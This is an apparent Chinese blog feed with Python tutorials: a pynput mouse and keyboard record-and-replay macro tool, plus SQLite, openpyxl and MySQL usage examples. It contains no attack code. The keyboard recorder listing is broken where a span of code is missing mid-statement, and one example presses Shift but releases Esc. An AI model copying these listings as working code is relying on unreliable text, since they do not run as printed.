鼠标事件的name值为mouse,考虑到后续还有可能会有其他设备的事件，比如键盘事件。鼠标的事件为点击事件，将event赋值为click。target表示目标，点击了鼠标左键,所以目标值为leftaction表示动作，鼠标点击分为按压和抬起，true表示抬起。location的值包含一个json对象，里面为当前事件鼠标的x和y坐标。鼠标的移动和滑动事件以此类推，用同样的模板格式进行记录。 将记录的数据写入到文件中 执行回放时通过逐行读取文件，解析文件中的json数据通过name、event、location等值进行事件执行。 之所以选择json时因为解析起来比较方便。当然你也可以使用数据库，比如SQLite等，或者自己定义一套自己的格式。json的存储方式有太多的冗余字符了，空间占用目前不是考虑的首要因素，这里先用最快的方式实现它。 GUI用了Python自带的tkinter库，为了防止UI阻塞，所以使用了多线程，同样是Python自带库threading。整个实现其实只用了一个三方库 pynput 鼠标事件的监听录制和执行回放的完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131import jsonimport threadingimport timeimport tkinterfrom pynput import mousefrom pynput.mouse import Button, Controller# 鼠标动作模板def mouse_action_template(): return &#123; "name": "mouse", "event": "default", "target": "default", "action": "default", "location": &#123; "x": "0", "y": "0" &#125; &#125;# 鼠标动作监听class MouseActionListener(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # 鼠标移动事件 def on_move(x, y): template = mouse_action_template() template['event'] = 'move' template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # 鼠标点击事件 def on_click(x, y, button, pressed): template = mouse_action_template() template['event'] = 'click' template['target'] = button.name template['action'] = pressed template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # 鼠标滚动事件 def on_scroll(x, y, x_axis, y_axis): template = mouse_action_template() template['event'] = 'scroll' template['location']['x'] = x_axis template['location']['y'] = y_axis file.writelines(json.dumps(template) + "\n") file.flush() with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener: listener.join()# 鼠标动作执行class MouseActionExecute(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'r', encoding='utf-8') as file: mouse_exec = Controller() line = file.readline() time.sleep(0.01) while line: obj = json.loads(line) if obj['name'] == 'mouse': if obj['event'] == 'move': mouse_exec.position = (obj['location']['x'], obj['location']['y']) time.sleep(0.01) elif obj['event'] == 'click': if obj['action']: if obj['target'] == 'left': mouse_exec.press(Button.left) else: mouse_exec.press(Button.right) else: if obj['target'] == 'left': mouse_exec.release(Button.left) else: mouse_exec.release(Button.right) time.sleep(0.01) elif obj['event'] == 'scroll': mouse_exec.scroll(obj['location']['x'], obj['location']['y']) time.sleep(0.01) line = file.readline()def button_onClick(action): m1 = MouseActionListener(file_name='mouse.action') m2 = MouseActionExecute(file_name='mouse.action') if action == 'listener': if startListenerBtn['text'] == '录制': m1.start() startListenerBtn['text'] = '录制中...关闭程序停止录制' startListenerBtn['state'] = 'disabled' elif action == 'execute': if startExecuteBtn['text'] == '回放': m2.start() startExecuteBtn['text'] = '回放中...关闭程序停止回放' startExecuteBtn['state'] = 'disabled'if __name__ == '__main__': root = tkinter.Tk() root.title('鼠标精灵-蓝士钦') root.geometry('200x200+400+100') startListenerBtn = tkinter.Button(root, text="录制", command=lambda: button_onClick('listener')) startListenerBtn.place(x=10, y=10, width=180, height=80) startExecuteBtn = tkinter.Button(root, text="回放", command=lambda: button_onClick('execute')) startExecuteBtn.place(x=10, y=110, width=180, height=80) root.mainloop() 按键精灵的鼠标部分到这里就基本完成了。运行程序，点击录制，然后就可以用你的鼠标在屏幕上一顿操作。然后关闭本程序。接着重新打开程序，点击回放，就会发现鼠标可以按照之前录制的动作进行自动工作了。记住千万不要在录制时，还没关闭程序的时候就点击回放，这样会陷入无限循环里面，会导致不停的录制不停的回放。还有键盘的程序后续补上，程序待完善中，未完待续。 键盘事件监听123456789101112131415161718192021222324252627from pynput import keyboard# 按键按下监听def on_press(key): try: print('press key &#123;0&#125;, vk: &#123;1&#125;'.format(key.char, key.vk)) except AttributeError: print('special press key &#123;0&#125;, vk: &#123;1&#125;'.format(key, key.value.vk))# 按键释放监听def on_release(key): if key == keyboard.Key.esc: # 停止监听 return False try: print('release key &#123;0&#125;, vk: &#123;1&#125;'.format(key.char, key.vk)) except AttributeError: print('special release key &#123;0&#125;, vk: &#123;1&#125;'.format(key, key.value.vk))# 键盘监听with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: listener.join() 键盘监听相对于鼠标监听来说，回调的函数只有两个on_press按键按下 和on_release按键释放。由于pynput这个库对键盘的不同按键事件封装进行了区分，比如普通的数字和字母键按下会进入on_press方法，通过传入的key.char属性值可以得到按键对应在键盘上的字符，但如果是Shift等其他特殊键，就没有char属性，会产生异常。只要捕获异常后直接通过key就可以取到特殊键对应的字符。我觉得这是pynput做得有点不够优雅的地方。普通的键有key.vk属性值，代表键盘上字符对应的编码值，特殊键的编码值要通过key.value.vk来取。 键盘事件执行1234567891011121314151617181920212223242526272829303132333435from pynput.keyboard import Key, Controller, KeyCode# 键盘控制对象keyboard = Controller()# 按下 a 键keyboard.press('a')# 释放 a 键keyboard.release('a')# 按下 Shift 键keyboard.press(Key.shift)keyboard.press('b')keyboard.release('b')keyboard.press('c')keyboard.release('c')# 释放 Shift 键keyboard.release(Key.esc)# 按下 Shift 键，然后依次按下其他按键，完成后Shift键自动释放with keyboard.pressed(Key.shift): keyboard.press('d') keyboard.release('d') keyboard.press('e') keyboard.release('e')# 依次按下 python （包括前面的空格）keyboard.type(' python')# 按下 vk值为56的键 shift 键keyboard.touch(KeyCode.from_vk(56), True)keyboard.touch('a', True)keyboard.touch('a', False)# 释放 shift 键keyboard.touch(Key.shift, False) 和监听方法对应，执行键盘的按键方法有press(key)按压 release(key)释放。除此之外还有touch(key,is_press)函数,key表示要操作的键，is_press 为True时表示按压，为False时表示释放。无论是哪种按压事件，Key都可以通过其他方式构造，比如知道Shift的vk值为56，那么就可以通过KeyCode.from_vk(56)来构造一个Shift的Key。通过VK编码构造Key的方式很有用，因为当你要按出一个@符号时，需要同时按住Shift和2。通过on_press(key)监听得到的值是一个@符号，如果录制程序录制了一个@符号将无法通过keyboard.press(&#39;@&#39;)这种方式直接执行。所以接下来的键盘录制回放程序我将通过定义一个键盘动作模板，然后通过VK值准确的记录每个键以及每个组合键的编码。然后通过keyboard.press(KeyCode.from_vk(vk))进行回放。 带录制回放功能的键盘精灵123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import jsonimport threadingimport timeimport tkinterfrom pynput import keyboardfrom pynput.keyboard import Controller, KeyCode# 键盘动作模板def keyboard_action_template(): return &#123; "name": "keyboard", "event": "default", "vk": "default" &#125;# 键盘动作监听class KeyboardActionListener(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # 键盘按下监听 def on_press(key): template = keyboard_action_template() template['event'] = 'press' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # 键盘抬起监听 def on_release(key): if key == keyboard.Key.esc: # 停止监听 startListenerBtn['text'] = '录制' startListenerBtn['state'] = 'normal' return False template = keyboard_action_template() template['event'] = 'release' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # 键盘监听 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: listener.join()# 键盘动作执行class KeyboardActionExecute(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'r', encoding='utf-8') as file: keyboard_exec = Controller() line = file.readline() time.sleep(3) while line: obj = json.loads(line) if obj['name'] == 'keyboard': if obj['event'] == 'press': keyboard_exec.press(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) elif obj['event'] == 'release': keyboard_exec.release(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) line = file.readline() startExecuteBtn['text'] = '回放' startExecuteBtn['state'] = 'normal'def button_onClick(action): m1 = KeyboardActionListener(file_name='keyboard.action') m2 = KeyboardActionExecute(file_name='keyboard.action') if action == 'listener': if startListenerBtn['text'] == '录制': m1.start() startListenerBtn['text'] = '录制中...esc停止录制' startListenerBtn['state'] = 'disabled' elif tener')) startListenerBtn.place(x=10, y=10, width=180, height=80) startExecuteBtn = tkinter.Button(root, text="回放", command=lambda: button_onClick('execute')) startExecuteBtn.place(x=10, y=110, width=180, height=80) root.mainloop() 键盘精灵的录制和回放程序到这里以及算是一个基础版本了，可以正常使用。并且新增了esc键监听，当用户点击esc时将会结束录制。鼠标精灵和键盘精灵都可以单独的运行使用。大多数场景下这两者的功能都会使用到，所以接下来我要实现一个完成的按键精灵，同时包含鼠标和键盘的录制回放功能。在之前的代码基础上进一步封装。 考虑的基本要素如下： 记录鼠标和记录键盘的事件采用不同的json模板进行定义，采用响应式对用户的操作进行监听，用户静止不动则不会写入文件。 同时监听鼠标和键盘，为了避免多线程写同一个文件的锁操作，我将鼠标和键盘的录制记录分为两个不同的文件。 录制和回放的操作通常都需要有一个等待时间的设置，所以代码里加上了GUI的设置部分，GUI没有设计所以后续这块代码要优化。 考虑录制和回放倒计时需要UI提示用户并且定时触发线程执行，所以封装了一个UI更新线程的类。 按键精灵0.1版本完整代码如下： 键鼠录制的按键精灵0.1版本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292import jsonimport threadingimport timeimport tkinterfrom pynput import keyboard, mousefrom pynput.keyboard import Controller as KeyBoardController, KeyCodefrom pynput.mouse import Button, Controller as MouseController# 键盘动作模板def keyboard_action_template(): return &#123; "name": "keyboard", "event": "default", "vk": "default" &#125;# 鼠标动作模板def mouse_action_template(): return &#123; "name": "mouse", "event": "default", "target": "default", "action": "default", "location": &#123; "x": "0", "y": "0" &#125; &#125;# 倒计时监听，更新UI触发自定义线程对象class UIUpdateCutDownExecute(threading.Thread): def __init__(self, cut_down_time, custom_thread_list): super().__init__() self.cut_down_time = cut_down_time self.custom_thread_list = custom_thread_list def run(self): while self.cut_down_time &gt; 0: for custom_thread in self.custom_thread_list: if custom_thread['obj_ui'] is not None: custom_thread['obj_ui']['text'] = str(self.cut_down_time) custom_thread['obj_ui']['state'] = 'disabled' self.cut_down_time = self.cut_down_time - 1 time.sleep(1) else: for custom_thread in self.custom_thread_list: if custom_thread['obj_ui'] is not None: custom_thread['obj_ui']['text'] = custom_thread['final_text'] custom_thread['obj_ui']['state'] = 'disabled' if custom_thread['obj_thread'] is not None: custom_thread['obj_thread'].start() time.sleep(1)# 键盘动作监听class KeyboardActionListener(threading.Thread): def __init__(self, file_name='keyboard.action'): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # 键盘按下监听 def on_press(key): template = keyboard_action_template() template['event'] = 'press' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # 键盘抬起监听 def on_release(key): if key == keyboard.Key.esc: # 停止监听 startListenerBtn['text'] = '开始录制' startListenerBtn['state'] = 'normal' keyboardListener.stop() return False template = keyboard_action_template() template['event'] = 'release' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # 键盘监听 with keyboard.Listener(on_press=on_press, on_release=on_release) as keyboardListener: keyboardListener.join()# 键盘动作执行class KeyboardActionExecute(threading.Thread): def __init__(self, file_name='keyboard.action', execute_count=0): super().__init__() self.file_name = file_name self.execute_count = execute_count def run(self): while self.execute_count &gt; 0: with open(self.file_name, 'r', encoding='utf-8') as file: keyboard_exec = KeyBoardController() line = file.readline() while line: obj = json.loads(line) if obj['name'] == 'keyboard': if obj['event'] == 'press': keyboard_exec.press(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) elif obj['event'] == 'release': keyboard_exec.release(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) line = file.readline() startExecuteBtn['text'] = '开始回放' startExecuteBtn['state'] = 'normal' self.execute_count = self.execute_count - 1# 鼠标动作监听class MouseActionListener(threading.Thread): def __init__(self, file_name='mouse.action'): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # 鼠标移动事件 def on_move(x, y): template = mouse_action_template() template['event'] = 'move' template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # 鼠标点击事件 def on_click(x, y, button, pressed): template = mouse_action_template() template['event'] = 'click' template['target'] = button.name template['action'] = pressed template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # 鼠标滚动事件 def on_scroll(x, y, x_axis, y_axis): template = mouse_action_template() template['event'] = 'scroll' template['location']['x'] = x_axis template['location']['y'] = y_axis file.writelines(json.dumps(template) + "\n") file.flush() with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouseListener: mouseListener.join()# 鼠标动作执行class MouseActionExecute(threading.Thread): def __init__(self, file_name='mouse.action', execute_count=0): super().__init__() self.file_name = file_name self.execute_count = execute_count def run(self): while self.execute_count &gt; 0: with open(self.file_name, 'r', encoding='utf-8') as file: mouse_exec = MouseController() line = file.readline() while line: obj = json.loads(line) if obj['name'] == 'mouse': if obj['event'] == 'move': mouse_exec.position = (obj['location']['x'], obj['location']['y']) time.sleep(0.01) elif obj['event'] == 'click': if obj['action']: if obj['target'] == 'left': mouse_exec.press(Button.left) else: mouse_exec.press(Button.right) else: if obj['target'] == 'left': mouse_exec.release(Button.left) else: mouse_exec.release(Button.right) time.sleep(0.01) elif obj['event'] == 'scroll': mouse_exec.scroll(obj['location']['x'], obj['location']['y']) time.sleep(0.01) line = file.readline()def command_adapter(action): if action == 'listener': if startListenerBtn['text'] == '开始录制': custom_thread_list = [ &#123; 'obj_thread': KeyboardActionListener(), 'obj_ui': startListenerBtn, 'final_text': '录制中...esc停止录制' &#125;, &#123; 'obj_thread': MouseActionListener(), 'obj_ui': None, 'final_text': None &#125; ] UIUpdateCutDownExecute(startTime.get(), custom_thread_list).start() elif action == 'execute': if startExecuteBtn['text'] == '开始回放': custom_thread_list = [ &#123; 'obj_thread': KeyboardActionExecute(execute_count=playCount.get()), 'obj_ui': startExecuteBtn, 'final_text': '回放中...关闭程序停止回放' &#125;, &#123; 'obj_thread': MouseActionExecute(execute_count=playCount.get()), 'obj_ui': None, 'final_text': None &#125; ] UIUpdateCutDownExecute(endTime.get(), custom_thread_list).start()def isNumber(content): if content.isdigit() or content == "": return True else: return Falseif __name__ == '__main__': root = tkinter.Tk() root.title('按键精灵-蓝士钦') root.geometry('200x200+400+100') listenerStartLabel = tkinter.Label(root, text='录制倒计时') listenerStartLabel.place(x=10, y=10, width=80, height=20) startTime = tkinter.IntVar() listenerStartEdit = tkinter.Entry(root, textvariable=startTime) listenerStartEdit.place(x=100, y=10, width=60, height=20) startTime.set(3) listenerTipLabel = tkinter.Label(root, text='秒') listenerTipLabel.place(x=160, y=10, width=20, height=20) startListenerBtn = tkinter.Button(root, text="开始录制", command=lambda: command_adapter('listener')) startListenerBtn.place(x=10, y=45, width=180, height=30) executeEndLabel = tkinter.Label(root, text='回放倒计时') executeEndLabel.place(x=10, y=85, width=80, height=20) endTime = tkinter.IntVar() executeEndEdit = tkinter.Entry(root, textvariable=endTime) executeEndEdit.place(x=100, y=85, width=60, height=20) endTime.set(6) executeTipLabel = tkinter.Label(root, text='秒') executeTipLabel.place(x=160, y=85, width=20, height=20) playCountLabel = tkinter.Label(root, text='回放次数') playCountLabel.place(x=10, y=115, width=80, height=20) playCount = tkinter.IntVar() playCountEdit = tkinter.Entry(root, textvariable=playCount) playCountEdit.place(x=100, y=115, width=60, height=20) playCount.set(1) playCountTipLabel = tkinter.Label(root, text='次') playCountTipLabel.place(x=160, y=115, width=20, height=20) startExecuteBtn = tkinter.Button(root, text="开始回放", command=lambda: command_adapter('execute')) startExecuteBtn.place(x=10, y=145, width=180, height=30) root.mainloop() 脚本精灵0.1版本完成😋 还需要考虑的点： 键盘事件没有记录用户每个动作之间的延迟时间，无法准确重放用户的输入节奏，后续考虑记录时间间隔点。 鼠标事件用户移动的越快，产生的点位变化也就越频繁，所以鼠标在回放时的速度与用户的操作基本一致。 鼠标没有停止回放的快捷键，要考虑如何停止回放鼠标事件。 输入法切换可能导致重放键盘按键时输入不准确，需要录制时是什么输入状态，重放时也要对应的键盘属性和状态 …还有很多需要考虑的点(原本只是想简单的做个示例程序) 程序只在MacOS平台上实验过，其他平台还未实验，一个相对完整的按键精灵在录制时应该获取更多的信息，这样在回放的时候才足够准确，后续考虑做一个更加精确的按键精灵，比如加入获取屏幕像素点，回放时通过采样比对，达到为所欲为功能。GitHub地址：https://github.com/lanshiqin/JerryMouse期待大家来一起完善它😋]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python提高工作效率之SQLite]]></title>
    <url>%2F204682e6%2F</url>
    <content type="text"><![CDATA[SQLite的数据库就是一个文件，并且Python内置了SQLite3，所以不需要安装任何东西就可以直接使用。在日常的脚本程序中不一定会用到像MySQL这样的数据库，经常会遇到一个简单的功能但是又需要关系型数据库的一些功能，SQLite足够小巧，而且是以文件的形式进行存放，方便脚本和文件同时跨平台拷贝后能够保留上一个平台的数据。 SQLite的使用方式同MySQL类似，都是需要得到一个连接对象Connection，然后通过Connection对象取到Cursor操作游标后就可以用游标的execute方法操作数据库了。和MySQL一样，在对数据库进行增删改的时候需要提交事务，如果操作成功通过cursor.rowcount会返回操作成功的条数。 快速开始由于SQLite比MySQL的操作更加简单，基本都是SQL操作，这里就不需要具体分析了。直接贴代码，需要时可回这里看一眼：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import sqlite3# 连接到数据库，如果文件不存在会自动在当前目录创建conn = sqlite3.connect('sample.db')# 获取到操作游标cursor = conn.cursor()# 通过操作游标执行SQL语句try: cursor.execute('create table score_table(id int (20) primary key , name varchar(255), score int(3))')except sqlite3.Error as err: print(err)# 插入数据users = [ (1, "蓝士钦", 96), (2, "李小龙", 100), (3, "阿里", 98), (4, "小李", 80), (5, "王大锤", 60),]for user in users: try: cursor.execute("insert into score_table(`id`,`name`,`score`) values (?,?,?)", user) if cursor.rowcount &gt; 1: print("插入成功!") except sqlite3.Error as err: print(err)# 删除数据delete_param = ("蓝士钦", 80)cursor.execute("delete from score_table where `name` = ? or score = ?", delete_param)# 修改数据cursor.execute("update score_table set `name` = ? where `name` = ?", ("小李", "大李"))# 查询数据 查询分数在 50 到 98 之间的人的名字, 分数从低到高进行排序cursor.execute("select `name` from score_table where score between ? and ? order by score asc ", (50, 98))# 输出查询结果print(cursor.fetchall())# 关闭操作游标cursor.close()# 提交连接事务conn.commit()# 关闭连接conn.close() SQLite属于嵌入式数据库，非常小巧，在各种便捷式移动设备上有着大量的应用。虽然SQLite也属于关系型数据库，但是为了便捷小巧所以一些关系型功能不如专业的关系型数据库，比如不支持主键自增等。具体差异和更多SQLite知识可查阅SQLite官网：https://www.sqlite.org/index.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python提高工作效率之Excel]]></title>
    <url>%2F983f7127%2F</url>
    <content type="text"><![CDATA[Excel本身提供了非常强大的功能，在数据统计和分析时经常会导出到CSV或者Excel等文件，也常常会从Excel读取数据进行计算。日常的自动化脚本读写数据时我使用比较多的也是Excel。对Excel的操作有各种不同的第三方库，效率以及平台支持都各有千秋。根据综合情况，我选择了支持最多平台，并且语法最简单易用的openpyxl这个库，在此做个简单的使用示例记录，根据每次使用遇到的问题以及解决方法都会增量修改文章，积累并总结问题能够方便日后遇到相同的问题时能够快速查阅并解决。 基础部分openpyxl支持的Python版本python版本必须大于2.7，并且不能是3.0.x到3.3.x的版本。openpyxl库不支持.xls后缀的文件只支持.xlsx后缀的Excel文件,不过只要是Office 2007 及后续的版本都支持.xlsx后缀的文件安装openpyxl:1pip install openpyxl openpyxl中API对应的Excel概念 Workbook 工作簿，对应一个.xls或.xlsx后缀的文件 Worksheet 工作表，一个Excel工作簿中，包含一个或多个工作表，通常在Excel的顶部或者底部标签栏中可以看到。 首先用Workbook构造或者打开一个Excel文件得到工作簿，然后通过工作簿对象获取Worksheet工作表。通过得到的工作表对象，就可以对该工作表的行和列进行读写操作了。 快速使用写入Excel1234567891011121314151617181920212223import datetimefrom openpyxl import Workbook# 创建工作簿wb = Workbook()# 获取激活的工作表（默认为第一个）ws = wb.active# 将当前工作表的A1单元格赋值为42ws['A1'] = 42# 从有数据单元格的下一行开始，从最左往右单元格分别赋值为 1 2 3ws.append([1, 2, 3])# 将当前工作表的A2单元格赋值为当前时间ws['A2'] = datetime.datetime.now()# 从有数据单元格的下一行开始，从最左往右单元格分别赋值为 1 2 3ws.append([1, 2, 3, 4])# 将文件内容保存到当前目录的 sample.xlsx 文件中wb.save("sample.xlsx") 上述代码中ws[&#39;A2&#39;]将A2原本的值1修改成了当前时间。保存后的Excel工作簿打开如下所示 读取Excel12345678910from openpyxl import load_workbook# 加载工作簿wb = load_workbook(filename='sample.xlsx')# 获取激活的工作表ws = wb.active# 打印工作表A1单元格的值print(ws['A1'].value) 复杂一点的用法写入Excel文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from openpyxl import Workbookfrom openpyxl.styles import Fontfrom openpyxl.styles import colorsfrom openpyxl.styles import Alignment# 创建工作簿wb = Workbook()# 获取激活的工作表（默认名称为Sheet）ws = wb.active# 设置工作表名称ws.title = "99乘法表"for x in range(1, 10): for y in range(1, 10): if x &gt;= y: ws.cell(x, y, str(y) + "*" + str(x) + "=" + str(x * y)) else: continue# 创建 "教师信息" 工作表，工作表位置为默认值ws_teacher = wb.create_sheet("教师信息")# 创建 "学生信息" 工作表,并设置工作表位置为第1个ws_student = wb.create_sheet("学生信息", 1)# 设置 "学生信息" 工作表的标签颜色，该值为RGB值ws_student.sheet_properties.tabColor = "1072BA"# 将"学生信息" 工作表的第1行第1列赋值为"姓名"ws_student.cell(row=1, column=1, value="姓名")# 将"学生信息" 工作表的第2行第1列赋值为"蓝士钦"ws_student.cell(row=2, column=1, value="蓝士钦")# 合并A1到F1单元格cell = ws_teacher.merge_cells('A1:F1')# 设置单元格字体为蓝色，15号大小，斜体ws_teacher['A1'].font = Font(color=colors.BLUE, size=15, italic=True)# 设置为垂直居中对齐,水平居中对齐ws_teacher['A1'].alignment = Alignment(vertical='center', horizontal='center')# 为单元格赋值ws_teacher['A1'] = "教师信息标题"# 将"教师信息" 工作表的第6行第6列赋值为"测试"ws_teacher.cell(row=6, column=6, value="测试")# 从 "学生信息" 工作表拷贝到新工作表target = wb.copy_worksheet(ws_student)# 设置工作表的名称target.title = "新工作表"# 将文件内容保存到当前目录的 sample2.xlsx 文件中wb.save("sample2.xlsx") 保存后的Excel工作簿打开，对应有多个工作表，每个工作表的内容分别如下所示： 读取Excel文件1234567891011121314151617181920from openpyxl import load_workbook# 加载工作簿wb = load_workbook(filename='sample2.xlsx')# 获取所有工作表wss = wb.worksheets# 遍历工作表for ws in wss: # 打印指定工作表的所有单元格的值 if ws.title == "99乘法表": for row in ws.rows: for index in row: if index.value is None: continue else: print(index.value + '\t', end='') print('') continue 有关openpyxl操作Excel单元格的样式和更详细的用法，参考其他作者的文章：https://www.jianshu.com/p/7af9a7c5b27d openpyxl官方文档地址：https://openpyxl.readthedocs.io/en/stable/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python提高工作效率之MySQL]]></title>
    <url>%2Fb4dc6b2c%2F</url>
    <content type="text"><![CDATA[日常开发测试中经常需要在数据库中造一些测试数据，为了能够快速完成任务，通常我都喜欢用Python来写。目前使用比较多的是MySQL数据库，Python有对应的很多第三方库可以用，但我还是坚持使用MySQL官方提供的支持库mysql-connector-python，因为这个库提供了MySQL的所有操作API，而且本身语法已经足够简单，对于写日常脚本来说已经足够。 准备工作 Python3.x环境 MySQL 8.0数据库 MySQL官方提供的Python驱动 不同的操作系统可选的安装方式都差不多，具体内容可以参照MySQL官方文档https://dev.mysql.com/doc/connector-python/en/connector-python-installation-binary.html 不过也不一定非要把驱动安装到系统上，比如下载驱动库就可以直接用Python去操作了，可以直接在当前的Python工程Env环境下安装1pip install mysql-connector-python 快速使用连接到数据库1.引入驱动库1import mysql.connector 2.打开/关闭连接12345cnx = mysql.connector.connect(user='root', password='123456', host='127.0.0.1', port='3306', database='py_example')cnx.close() mysql.connector.connect()方法提供了很多参数，有些参数是可选的，比如端口号如果不传默认就是33063.异常的捕获12345678910import mysql.connectortry: cnx = mysql.connector.connect(user='root', password='123456', host='127.0.0.1', port='3307', database='py_example') cnx.close()except mysql.connector.Error as err: print(err) 所连接的MySQL端口号为3306，在代码中故意将端口号设置为3307,使其无法正常连接到数据库，抛出异常后将被捕获并打印：12003 (HY000): Can&apos;t connect to MySQL server on &apos;127.0.0.1&apos; (61) 如果要根据不同的错误码进行自定义输出，可以在头部引入from mysql.connector import errorcode,通过对比捕获的err.errno和errorcode的各种预定义错误值进行比对,更多连接方式和详细的异常捕获输出，可以参照官方文档：https://dev.mysql.com/doc/connector-python/en/connector-python-example-connecting.html 灵活的连接参数1234567891011121314151617import mysql.connectorconfig = &#123; "user": "root", "password": "123456", "host": "127.0.0.1", "database": "py_example"&#125;def connect(conf): try: cnx = mysql.connector.connect(**conf) except mysql.connector.Error as err: print(err) else: return cnx mysql.connector.connect()方法支持传入一个json对象，这样就可以很方便的把数据库连接定义到外部或者外部文件。连接数据库是为了得到连接对象，所以定义一个connect()方法，传入参数为数据库配置，该方法返回一个数据库连接对象cnx。 数据库的基本操作通过mysql.connector.connect()返回一个connect连接对象，通过该连接对象的cursor()方法可以得到操作数据库的游标。123if __name__ == '__main__': conn = connect(config) cursor = conn.cursor() 通过cursor.execute()方法就可以执行SQL语句了。 创建数据库1cursor.execute("CREATE DATABASE &#123;&#125; DEFAULT CHARACTER SET 'utf8mb4'".format('db_name')) 创建表12345678910table_sql = """CREATE TABLE `table_name` ( `t_id` INT(11) NOT NULL AUTO_INCREMENT, `name` VARCHAR(255) NOT NULL , `gender` ENUM('M','F') NOT NULL , `birth_date` DATE NOT NULL, PRIMARY KEY (`t_id`)) ENGINE = INNODB"""cursor.execute(table_sql) 插入数据123456insert_sql = """INSERT INTO `table_name` (`name`,`gender`,`birth_date`) VALUES ('蓝士钦','M','1995-01-29')"""cursor.execute(insert_sql)# conn默认不会自动提交事务，所以这里一定要手动提交事务，否则记录不会插入到MySQL中conn.commit() 除了使用SQL拼接方式，还可以使用模块符代替，然后通过传入一个Python元组的方式1234567insert_sql_template = """INSERT INTO `table_name` (`name`,`gender`,`birth_date`) VALUES (%s,%s,%s)"""insert_sql_date = ('蓝士钦', 'M', date(1995, 1, 29))cursor.execute(insert_sql_template,insert_sql_date)# 提交事务conn.commit() 除了使用元组，还可以使用Json格式的对象作为变量填充参数12345678910111213sql = """INSERT INTO `table_name` (`name`,`gender`,`birth_date`) VALUES (%(name)s,%(gender)s,%(birth_date)s)"""data = &#123; "name": "测试姓名", "gender": "M", "birth_date": date(1995, 1, 29),&#125;cursor.execute(sql,data)# 提交事务conn.commit() 可以看到代码中每次使用cursor.execute()方法执行sql语句之后，都需要掉用连接对象conn.commit()方法，conn默认不会自动提交事务，所以这里一定要手动提交事务，否则记录不会插入到MySQL中。不过也可以根据实际使用场景，设置每次execute都自动提交事务，只需要获取到连接对象后设置1conn.autocommit = True 修改数据123456modify_sql = """UPDATE `table_name` SET `name`='李小龙',`birth_date`='1940-11-27' WHERE `gender`='M'"""cursor.execute(modify_sql)# 提交事务conn.commit() 查询数据12345678query_sql = """SELECT `t_id`,`name`,`gender`,`birth_date` FROM `table_name` WHERE `birth_date` BETWEEN %s and %s"""start_date = date(1990, 1, 1)end_date = date(2000, 1, 1)cursor.execute(query_sql, (start_date, end_date))for (t_id, name, gender, birth_date) in cursor: print("&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;".format(t_id, name, gender, birth_date)) 删除数据12345678910delete_sql = """DELETE FROM `table_name` WHERE `name` = %(name)s"""delete_action = &#123; "name": "姓名"&#125;# 执行sqlcursor.execute(delete_sql, delete_action)# 提交事务conn.commit() 完整实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123import mysql.connectorfrom datetime import dateconfig = &#123; "user": "root", "password": "123456", "host": "127.0.0.1", "database": "py_example"&#125;def connect(conf): try: cnx = mysql.connector.connect(**conf) except mysql.connector.Error as err: print(err) else: return cnxdef create_database(db_cursor, db_name): try: db_cursor.execute("CREATE DATABASE &#123;&#125; DEFAULT CHARACTER SET 'utf8mb4'".format(db_name)) except mysql.connector.Error as err: print(err.msg)def create_tables(db_cursor, sql_str): try: db_cursor.execute(sql_str) except 